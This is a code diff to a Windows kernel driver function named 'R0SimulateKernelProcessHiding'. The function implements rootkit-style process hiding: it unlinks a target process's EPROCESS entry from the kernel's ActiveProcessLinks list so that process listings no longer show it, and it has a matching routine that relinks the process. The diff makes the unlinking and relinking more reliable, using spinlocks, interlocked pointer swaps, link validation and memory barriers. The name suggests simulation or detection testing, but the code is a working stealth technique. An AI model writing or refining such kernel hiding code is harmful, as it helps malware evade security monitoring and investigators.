@@ -2202,8 +2202,11 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
             PHIDDEN_PROCESS_ENTRY pEntry;
             ULONG pid;
             KIRQL oldIrql;
-            BOOLEAN alreadyHidden = FALSE;
             PLIST_ENTRY pLink;
+            PLIST_ENTRY pPrev;
+            PLIST_ENTRY pNext;
+            BOOLEAN alreadyHidden = FALSE;
+            BOOLEAN linkValid = FALSE;
 
             if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
                 return STATUS_BUFFER_TOO_SMALL;
@@ -2213,6 +2216,15 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
             status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pTarget);
             if (!NT_SUCCESS(status)) return status;
 
+            pEntry = (PHIDDEN_PROCESS_ENTRY)ExAllocatePoolWithTag(
+                NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'HIDE');
+            if (!pEntry) { ObDereferenceObject(pTarget); return STATUS_INSUFFICIENT_RESOURCES; }
+            RtlZeroMemory(pEntry, sizeof(HIDDEN_PROCESS_ENTRY));
+            pEntry->ProcessId = (HANDLE)(ULONG_PTR)pid;
+            pEntry->EProcess  = pTarget;
+
+            pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
+
             KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
             __try {
                 PLIST_ENTRY pList = g_HiddenListHead.Flink;
@@ -2221,40 +2233,47 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
                     if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) { alreadyHidden = TRUE; break; }
                     pList = pList->Flink;
                 }
-            }
-            __except (EXCEPTION_EXECUTE_HANDLER) { alreadyHidden = FALSE; }
-            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
 
-            if (alreadyHidden) { ObDereferenceObject(pTarget); return STATUS_ALREADY_COMMITTED; }
+                if (!alreadyHidden) {
+                    if (pLink != NULL &&
+                        pLink->Flink != NULL && pLink->Blink != NULL &&
+                        pLink->Flink != pLink && pLink->Blink != pLink) {
+                        linkValid = TRUE;
+                    }
 
-            pEntry = (PHIDDEN_PROCESS_ENTRY)ExAllocatePoolWithTag(
-                NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'HIDE');
-            if (!pEntry) { ObDereferenceObject(pTarget); return STATUS_INSUFFICIENT_RESOURCES; }
-            RtlZeroMemory(pEntry, sizeof(HIDDEN_PROCESS_ENTRY));
-            pEntry->ProcessId = (HANDLE)(ULONG_PTR)pid;
-            pEntry->EProcess = pTarget;
+                    if (linkValid) {
+                        pPrev = (PLIST_ENTRY)pLink->Blink;
+                        pNext = (PLIST_ENTRY)pLink->Flink;
 
-            pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
-            __try { RemoveEntryList(pLink); }
-            __except(EXCEPTION_EXECUTE_HANDLER) {
-                ObDereferenceObject(pTarget);
-                ExFreePoolWithTag(pEntry, 'HIDE');
-                return GetExceptionCode();
-            }
+                        InterlockedExchangePointer((PVOID volatile*)&pPrev->Flink, pNext);
+                        InterlockedExchangePointer((PVOID volatile*)&pNext->Blink, pPrev);
+                        KeMemoryBarrier();
 
-            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
-            __try {
-                InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
+                        InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
+                    } else {
+                        status = STATUS_INVALID_PARAMETER;
+                    }
+                }
             }
             __except (EXCEPTION_EXECUTE_HANDLER) {
                 KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
-                __try { InsertHeadList((PLIST_ENTRY)((PCHAR)PsInitialSystemProcess + g_ActiveProcessLinksOffset), pLink); }
-                __except (EXCEPTION_EXECUTE_HANDLER) { }
                 ObDereferenceObject(pTarget);
                 ExFreePoolWithTag(pEntry, 'HIDE');
                 return GetExceptionCode();
             }
             KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+
+            if (alreadyHidden) {
+                ObDereferenceObject(pTarget);
+                ExFreePoolWithTag(pEntry, 'HIDE');
+                return STATUS_ALREADY_COMMITTED;
+            }
+
+            if (!linkValid) {
+                ObDereferenceObject(pTarget);
+                ExFreePoolWithTag(pEntry, 'HIDE');
+                return status;
+            }
 
             if (OutputSize >= sizeof(NTSTATUS)) {
                 __try { *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS; }
@@ -2268,8 +2287,10 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
             ULONG pid;
             KIRQL oldIrql;
             PHIDDEN_PROCESS_ENTRY pEntry = NULL;
-            PEPROCESS pProc;
-            PLIST_ENTRY pLink, pSysLink;
+            PEPROCESS pProc = NULL;
+            PLIST_ENTRY pLink;
+            PLIST_ENTRY pSysLink;
+            PLIST_ENTRY pOldNext;
             PEPROCESS pSys;
 
             if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
@@ -2285,25 +2306,34 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
                     if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
                         pEntry = pCur;
                         RemoveEntryList(&pEntry->ListEntry);
+                        pProc = pEntry->EProcess;
                         break;
                     }
                     pList = pList->Flink;
                 }
+
+                if (pProc != NULL) {
+                    pLink    = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
+                    pSys     = PsInitialSystemProcess;
+                    pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
+                    pOldNext = (PLIST_ENTRY)pSysLink->Flink;
+                    pLink->Flink = pOldNext;
+                    pLink->Blink = pSysLink;
+                    KeMemoryBarrier();
+                    InterlockedExchangePointer((PVOID volatile*)&pOldNext->Blink, pLink);
+                    InterlockedExchangePointer((PVOID volatile*)&pSysLink->Flink, pLink);
+                    KeMemoryBarrier();
+                }
             }
-            __except (EXCEPTION_EXECUTE_HANDLER) { pEntry = NULL; }
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+                return GetExceptionCode();
+            }
             KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
 
             if (!pEntry) return STATUS_NOT_FOUND;
 
-            pProc = pEntry->EProcess;
-            if (pProc) {
-                pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
-                pSys = PsInitialSystemProcess;
-                pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
-                __try { InsertHeadList(pSysLink, pLink); }
-                __except(EXCEPTION_EXECUTE_HANDLER) { }
-                ObDereferenceObject(pProc);
-            }
+            if (pProc) ObDereferenceObject(pProc);
             ExFreePoolWithTag(pEntry, 'HIDE');
 
             if (OutputSize >= sizeof(NTSTATUS)) {
